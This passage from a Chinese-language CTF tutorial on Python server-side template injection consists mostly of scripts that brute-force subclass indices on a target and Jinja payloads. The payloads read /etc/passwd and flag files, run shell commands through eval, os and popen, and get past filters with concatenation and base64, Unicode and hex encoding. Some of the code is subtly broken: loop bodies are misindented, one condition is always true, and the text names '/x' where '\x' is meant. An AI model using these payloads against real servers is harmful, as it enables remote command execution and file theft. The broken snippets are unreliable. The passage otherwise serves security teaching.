    (126, )
    (127, )
    (128, )
    (129, )
    (130, )
    (131, )
    (132, )
    (133, )
    (134, )
    (135, )
    (136, )
    (137, )
    (138, )
可以看出2.7有的3.6大部分都有，但还是有一些子类是不一样的。
SSTI的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。
但python的版本不同，要利用的类的位置就不同，索引号就不同，下面借鉴了一下S神的遍历python环境中类的脚本：
    #by S神
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
    }
    for i in range(500):
        url = "http://xxx.xxx.xxx.xxx:xxxx/?get参数={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"
        res = requests.get(url=url,headers=headers)
        if 'FileLoader' in res.text: #以FileLoader为例
            print(i)
    # 得到编号为79
    #by S神
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
    }
    for i in range(500):
        url = "http://xxx.xxx.xxx.xxx:xxxx/"
        postPara = {"post参数":"{{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"}
        res = requests.post(url=url,headers=headers,data=postPara)
        if 'FileLoader' in res.text: #以FileLoader为例，查找其他命令时就用其他子类
            print(i)
    # 得到编号为79
`__builtins__`：以一个集合的形式查看引用
builtins是python中的一个模块。该模块提供对Python的所有“内置”标识符的直接访问；例如，builtins.open 是内置函数的全名
open() 。
当我们启动一个python解释器时，即使没有创建任何变量或者函数，还是会有很多函数使用，我们称之为内建函数。
内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用。
`__builtins__`方法是作为默认初始模块出现的，可用于查看当前所有导入的内建函数。
`__globals__`：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性  
是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该  
文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全  
局变量的字典引用。
`__import__()`：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 **import** ()  
来动态载入，就是 import 。语法： **import** (模块名)
这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子  
类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现  
文件读取和命令执行的：
    找到父类 ---> 寻找子类 ---> 找关于命令执行或者文件操作的模块。
### 用SSTI读取文件
#### python2
在上文中我们用`__subclass__`看到了基类的所有子类，在我们整理的子类中的第四十项`(40, )`（实际的索引可能不同，需要动态识别），可以用于读写文档
    >>>[].__class__.__mro__[-1].__subclasses__()[40]
    >>>[].__class__.__mro__[-1].__subclasses__()[40]("/etc/passwd").read()
    '##\n# User Database\n# \......'
    builtins
#### python3
使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用  
这个类去读取文件。
首先编写脚本遍历目标Python环境中 ``这个类索引号：
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
    (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }
    for i in range(500):
        url = "http://47.xxx.xxx.72:8000/?name=
    {{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"
        res = requests.get(url=url, headers=headers)
        if 'FileLoader' in res.text:
            print(i)
    # 得到编号为79
### 利用SSTI执行命令
可以用来执行命令的类有很多，其基本原理就是遍历含有eval函数即os模块的子类，利用这些子类中的  
eval函数即os模块执行命令。
#### 寻找内建函数eval执行命令
    import requests
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'}
    for i in range(500):
        url = "http://3d25cf80-d891-4046-86a7-931d17efb62d.challenge.ctf.show/?name=\
            {{().__class__.__bases__[0].__subclasses__()[" + str(i) + "].__init__.__globals__['__builtins__']}}"
    res = requests.get(url=url, headers=headers)
    if 'eval' in res.text:
        print(i)
记住几个含有eval函数的类
    warnings.catch_warnings
    WarningMessage
    codecs.IncrementalEncoder
    codecs.IncrementalDecoder
    codecs.StreamReaderWriter
    os._wrap_close
    reprlib.Repr
    weakref.finalize
    etc.
#### 寻找 os 模块执行命令
Python的 os
模块中有system和popen这两个函数可用来执行命令。其中`system()`函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；`popen()`函数执行命令有回显。所以比较常用的函数为`popen()`函数，而当`popen()`函数被过滤掉时，可以使用`system()`函数代替。
首先编写脚本遍历目标Python环境中含有os模块的类的索引号
    import requests
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'}
    for i in range(500):
        url = "http://3d25cf80-d891-4046-86a7-931d17efb62d.challenge.ctf.show/?name=\
            {{().__class__.__bases__[0].__subclasses__()[" + str(i) + "].__init__.__globals__}}"
    res = requests.get(url=url, headers=headers)
    if 'os.py' in res.text:
        print(i)
但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。  
我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是
os._wrap_close ，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。
#### 寻找 popen 函数执行命令
    import requests
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'}
    for i in range(500):
        url = "http://3d25cf80-d891-4046-86a7-931d17efb62d.challenge.ctf.show/?name=\
            {{().__class__.__bases__[0].__subclasses__()[" + str(i) + "].__init__.__globals__}}"
    res = requests.get(url=url, headers=headers)
    if 'popen' or 'os._wrap_close' in res.text:
        print(i)
## 如何绕过
在做题的时候我们会遇到各种各样的过滤，既然有过滤我们想要执行命令的话就必须绕过，那么如何绕过呢？
### 检查过滤
这里用到一款软件superdic，其可李用以自动生成fuzz字典，然后利用bp抓包工具对注入点进行注入，很容易就可以得到该题过滤了什么。
### 关键字绕过
#### 拼接绕过
我们可以利用“+”进行字符串拼接，绕过关键字过滤
但是往往这种绕过需要一定的条件，返回的要是字典类型的或是字符串格式（即str）的，即payload中引号内的，在调用的时候才可以使用字符串拼接绕过，我们要学会怎么把被过滤的命令放在能拼接的地方。
    {{().__class__.__bases__[0].__subclasses__()[40]('/fl'+'ag').read()}}
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("o"+"s").popen("ls /").read()')}}
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__buil'+'tins__']['eval']('__import__("os").popen("ls /").read()')}}
payload中引号内的，在调用的时候都可以使用字符串拼接绕过。
#### 编码绕过
##### base64编码绕过
对引号内的代码进行base64编码后再后接`.decode('base64')`可以进行绕过
例如
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
编码后为
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ=='.decode('base64'))}}
只要是字符串的，即payload中引号内的，都可以用编码绕过。同理还可以进行rot13，16进制编码。这一切都是基于我们可以执行命令实现的。
##### 利用Unicode编码绕过
这种方法网上没有，看了whoami大神和S神的笔记才知道还有这种方法。
例如
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
转换后为
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\u006f\u0073'].popen('\u006c\u0073\u0020\u002f').read()}}
当我们使用eval来执行命令时几乎所有命令都是置于引号之下的，所以我们利用对引号内的内容进行编码绕过的话是可以轻松绕过许多过滤的，例如对os，ls等的过滤。
##### 利用hex编码绕过
当过滤了`u`时，上面的Unicode与base64编码就不灵了，所以我们需要使用一种与前两种编码形式区别较大的编码来进行绕过
我们可以利用hex编码的方法进行绕过
例如
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
转换后为
    {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['\x6f\x73'].popen('\x6c\x73\x20\x2f').read()}}
这里注意，在进行hex编码的时候我们需要选用`/x`的形式，这样才能有效绕过。
##### 利用引号绕过